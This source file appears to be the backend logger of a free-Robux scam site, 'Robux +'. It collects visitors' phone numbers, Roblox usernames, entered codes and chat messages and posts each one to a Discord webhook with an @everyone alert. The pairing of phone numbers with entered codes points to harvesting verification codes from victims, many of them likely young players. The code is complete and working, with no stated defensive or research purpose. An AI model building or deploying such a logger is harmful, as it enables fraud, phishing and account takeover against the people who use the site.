import { NextResponse } from "next/server"

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL

interface LogBody {
  type: "inscription" | "code_saisi" | "chat_message"
  phone?: string
  pseudo?: string
  code?: string
  amount?: string
  message?: string
}

export async function POST(req: Request) {
  let body: LogBody
  try {
    body = (await req.json()) as LogBody
  } catch {
    return NextResponse.json({ ok: false, error: "invalid_json" }, { status: 400 })
  }

  if (!body || !body.type) {
    return NextResponse.json({ ok: false, error: "missing_type" }, { status: 400 })
  }

  let embed

  if (body.type === "inscription") {
    embed = {
      title: "📝 Nouvelle inscription Robux +",
      color: 0x3b82f6,
      fields: [
        { name: "Numéro", value: "`" + (body.phone ?? "—") + "`", inline: true },
        { name: "Pseudo Roblox", value: "`" + (body.pseudo ?? "—") + "`", inline: true },
      ],
      footer: { text: "Robux + • Logger" },
      timestamp: new Date().toISOString(),
    }
  } else if (body.type === "code_saisi") {
    const fields = [
      { name: "Code", value: "`" + (body.code ?? "—") + "`", inline: true },
      { name: "Numéro", value: "`" + (body.phone ?? "—") + "`", inline: true },
      { name: "Pseudo Roblox", value: "`" + (body.pseudo ?? "—") + "`", inline: true },
    ]
    if (body.amount) {
      fields.push({ name: "Montant", value: "`" + parseInt(body.amount).toLocaleString("fr-FR") + " Robux`", inline: true })
    }
    embed = {
      title: "🔑 Code saisi",
      color: 0x1e40af,
      fields,
      footer: { text: "Robux + • Logger" },
      timestamp: new Date().toISOString(),
    }
  } else if (body.type === "chat_message") {
    embed = {
      title: "💬 Message dans le chat",
      color: 0x9ca3af,
      fields: [
        { name: "Message", value: "`" + (body.message ?? "—") + "`", inline: false },
      ],
      footer: { text: "Robux + • Logger" },
      timestamp: new Date().toISOString(),
    }
  } else {
    return NextResponse.json({ ok: false, error: "unknown_type" }, { status: 400 })
  }

  const payload = {
    username: "Robux + • Logs",
    content: "@everyone",
    allowed_mentions: { parse: ["everyone"] },
    embeds: [embed],
  }

  if (!WEBHOOK_URL) {
    console.warn("[DISCORD_WEBHOOK] URL non configurée — log ignoré:", body.type)
    return NextResponse.json({ ok: true, forwarded: false })
  }

  try {
    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
    if (!res.ok) {
      console.error("[DISCORD_WEBHOOK] HTTP", res.status, await res.text())
      return NextResponse.json({ ok: false, error: "webhook_failed" }, { status: 502 })
    }
    return NextResponse.json({ ok: true, forwarded: true })
  } catch (e) {
    console.error("[DISCORD_WEBHOOK] Exception:", e)
    return NextResponse.json({ ok: false, error: "fetch_error" }, { status: 500 })
  }
}

export async function GET() {
  return NextResponse.json({ ok: true, webhook_configured: Boolean(WEBHOOK_URL) })
}
